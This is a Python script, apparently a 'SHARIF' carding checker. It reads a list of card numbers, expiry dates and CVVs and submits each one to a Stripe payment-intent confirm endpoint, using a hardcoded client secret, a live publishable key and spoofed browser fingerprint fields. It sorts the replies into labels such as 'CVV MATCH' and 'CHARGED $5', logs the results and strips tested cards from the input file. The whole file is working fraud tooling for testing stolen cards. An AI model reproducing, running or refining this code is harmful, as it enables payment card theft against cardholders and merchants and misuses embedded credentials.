import os
import timeit
from concurrent.futures import ThreadPoolExecutor
from urllib import response
try:
    import requests
except:
    os.system("pip install requests")
import sys
import os
import time
class ColorsClass:
    CRED2 = "\33[93m"
    CBLUE2 = "\33[94m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"

os.system('clear || cls')
# banner
banner = f"""
░██████╗██╗░░██╗░█████╗░██████╗░██╗███████╗
██╔════╝██║░░██║██╔══██╗██╔══██╗██║██╔════╝
╚█████╗░███████║███████║██████╔╝██║█████╗░░
░╚═══██╗██╔══██║██╔══██║██╔══██╗██║██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░░██║██║██║░░░░░
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░

  """


for col in banner:
    print(ColorsClass.CRED2 + col, end="")
    sys.stdout.flush()
    time.sleep(0)


def timer(number, repeat):
    def wrapper(func):
        runs = timeit.repeat(func, number=number, repeat=repeat)
        print(sum(runs) / len(runs))
    return wrapper
  
list = input(f"{ColorsClass.CBLUE2} Enter your cc file  =  {ColorsClass.CRED2}")
pi_ = "pi_3Lq9goB7zDC0drK81xEcLU9j_secret_jZnSw44LH8pXY84ABqli9RIsK"
pi = pi_.split('_secret')[0]
URL = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"

def fetch(session, URL):
   
    total = sum(1 for _ in open(list))
    running = 0
    for X in open(list, 'r+', encoding='utf-8').read().splitlines():
        running += 1                  
        cc = X.split('|')[0]
        cv = X.split('|')[3]
        mo = X.split('|')[1]
        ye = X.split('|')[2]
        data = f"payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cv}&payment_method_data[card][exp_month]={mo}&payment_method_data[card][exp_year]={ye}&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[guid]=7c18020c-3b47-4d17-957e-7ebb63b28751e241f9&payment_method_data[muid]=1c4753b4-86ab-4330-9325-841c5a6be074efe8d3&payment_method_data[sid]=eccbced9-4716-45ae-8338-eb63042f8abbd9334a&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F1b11d2e60%3B+stripe-js-v3%2F1b11d2e60&payment_method_data[time_on_page]=13280&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HNUX1B7zDC0drK8sRj8haOEOxk8bhuI3ymfE9c51igSbpd9DobzAVWlQXReI6opqlGTKaIuo37tphcBq0HYHU19007vBkUgLF&client_secret={pi_}"
        resp  = session.post(URL , data).text


        if "card was declined" in resp or 'card_declined' in resp or 'The transaction has been declined' in resp or 'Processor Declined' in resp:
            r_resp, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
        elif 'Your card number is incorrect' in resp or 'Call to a member function attach() on null' in resp:
            r_resp, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
        elif 'incorrect_zip' in resp or 'Your card zip code is incorrect.' in resp or 'The zip code you supplied failed validation' in resp or 'card zip code is incorrect' in resp:
            r_resp, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
        elif "card has insufficient funds" in resp or 'insufficient_funds' in resp or 'Insufficient Funds' in resp:
            r_resp, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
        elif 'incorrect_cvc' in resp or "card's security code is incorrect" in resp or "card&#039;s security code is incorrect" in resp or "security code is invalid" in resp or 'CVC was incorrect' in resp or "incorrect CVC" in resp or 'cvc was incorrect' in resp or 'Card Issuer Declined CVV' in resp or 'security code is incorrect' in resp:
            r_resp, r_logo, r_respo = "CCN MATCH", "✅", 'CCN Match'
        elif "card does not support this type of purchase" in resp or 'transaction_not_allowed' in resp or 'Transaction Not Allowed' in resp:
            r_resp, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
        elif "Customer authentication is required" in resp or "unable to authenticate" in resp or "three_d_secure_redirect" in resp or "hooks.stripe.com/redirect/" in resp or 'requires an authorization' in resp or 'card_error_authentication_required' in resp:
            r_resp, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
        elif "card has expired" in resp or 'Expired Card' in resp:
            r_resp, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
        elif 'Donation Confirmation' in resp or "This page doesn't seem to exist" in resp or 'seller_message": "Payment complete."' in resp or '"cvc_check": "pass"' in resp or 'thank_you' in resp or '"type":"one-time"' in resp or '"state": "succeeded"' in resp or "Your payment has already been processed" in resp or '"status": "succeeded"' in resp or 'Thank' in resp:
            r_resp, r_logo, r_respo = "CHARGED $5", "✅", 'CVV MATCH'
        else:
            r_resp, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
        r_resp1 = resp.strip() if resp else r_resp
        print(f"{X} {running}/{total} {r_logo} {r_respo}")
        try:
            with open("resp.txt", "a")as f:
                f.write(f"{X} {running}/{total}  {r_resp}   \n")
            lines = [] 
            with open(list , 'r') as dab:
                lines = dab.readlines()
            with open(list , 'w') as dab:
                for number, line in enumerate(lines):
                    if number not in [0]:
                        dab.write(line)
        except:
            continue                                                 
@timer(1, 1)
def main():
    with ThreadPoolExecutor(max_workers=100) as executor:
        with requests.Session() as session:
            executor.map(fetch, [session], [URL])
            

                            
    